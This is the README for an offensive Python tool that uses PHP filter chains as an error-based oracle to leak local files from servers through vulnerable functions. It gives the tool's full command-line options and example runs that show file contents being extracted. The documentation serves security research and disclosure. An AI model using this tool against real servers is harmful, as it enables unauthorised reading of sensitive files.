# PHP filter chains: file read from error-based oracle

A CLI to exploit parameters affected by the file read caused by the the error-based oracle of PHP filter chains. It can be used to leak the content of a local file when passed to vulnerable functions, such as `file()`, `hash_file()`, `file_get_contents()` or `copy()`, even when the server does not return the file content!

As long as an action is performed on a file content and the full URI is controlled, the function can be affected by the `php://filter` wrapper, and therefore exploited by this tool. More information in our blogpost: https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle

The trick was first discovered and disclosed as a challenge by @hash_kitten during the DownUnderCTF 2022.

## Usage
By default, the tool requires the parameters `target` (targeted URL), `file` (the local file to leak) and `parameter` (parameter where you want to inject). 
Several other options can be defined and are detailed here: 

```bash
$ python3 filters_chain_oracle_exploit.py --help
usage: filters_chain_oracle_exploit.py [-h] --target TARGET --file FILE --parameter PARAMETER [--data DATA] [--headers HEADERS] [--verb VERB] [--proxy PROXY] [--in_chain IN_CHAIN]
                                       [--time_based_attack TIME_BASED_ATTACK] [--delay DELAY] [--json JSON] [--match MATCH] [--offset OFFSET] [--log LOG]

        Oracle error based file leaker based on PHP filters.
        Author of the tool : @_remsio_
        Trick firstly discovered by : @hash_kitten
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        $ python3 filters_chain_oracle_exploit.py --target http://127.0.0.1 --file '/test' --parameter 0   
        [*] The following URL is targeted : http://127.0.0.1
        [*] The following local file is leaked : /test
        [*] Running POST requests
        [+] File /test leak is finished!
        b'SGVsbG8gZnJvbSBTeW5hY2t0aXYncyBibG9ncG9zdCEK'
        b"Hello from Synacktiv's blogpost!\n"
        

options:
  -h, --help            show this help message and exit
  --target TARGET       URL on which you want to run the exploit.
  --file FILE           Path to the file you want to leak.
  --parameter PARAMETER
                        Parameter to exploit.
  --data DATA           Additionnal data that might be required. (ex : {"string":"value"})
  --headers HEADERS     Headers used by the request. (ex : {"Authorization":"Bearer [TOKEN]"})
  --verb VERB           HTTP verb to use POST(default),GET(~ 135 chars by default),PUT,DELETE
  --proxy PROXY         Proxy you would like to use to run the exploit. (ex : http://127.0.0.1:8080)
  --in_chain IN_CHAIN   Useful to bypass weak strpos configurations, adds the string in the chain. (ex : KEYWORD)
  --time_based_attack TIME_BASED_ATTACK
                        Exploits the oracle as a time base attack, can be improved. (ex : True)
  --delay DELAY         Set the delay in second between each request. (ex : 1, 0.1)
  --json JSON           Send data as JSON (--json=1)
  --match MATCH         Match a pattern in the response as the oracle (--match='Allowed memory size of')
  --offset OFFSET       Offset from which a char should be leaked (--offset=100)
  --log LOG             Path to log file (--log=/tmp/output.log)
```

## Usage as a library

If you want to use the logic from the library in a python script, you can import `Bruteforcer` and implement a subclass.

```python
from php_filter_chains_oracle_exploit.filters_chain_oracle.core.bruteforcer import Bruteforcer

class MyBruteforcer(Bruteforcer):
    ...
```

## Improvements

Other features may be added to the tool, feel free to contribute if you have ideas!

### Run unit tests

Before making a Pull Request, please make sure that all tests are still working. To do so, you need to have `php` and `python3` installed.

Once the setup is ready, run the command `python3 -m unittest` from the folder `filters_chain_oracle` :

```bash
$ python3 -m unittest
.[*] The following URL is targeted : http://127.0.0.1:42424/tmpnkrg4kv8.php
[*] The following local file is leaked : /tmp/tmpiabnwasl
[*] Running POST requests
[+] File /tmp/tmpiabnwasl leak is finished!
YWJjZGVmZ2hpamtsbW5v
b'abcdefghijklmno'
[*] Info logged in : /tmp/tmp2oycnj_s
..
----------------------------------------------------------------------
Ran 3 tests in 26.823s

OK
```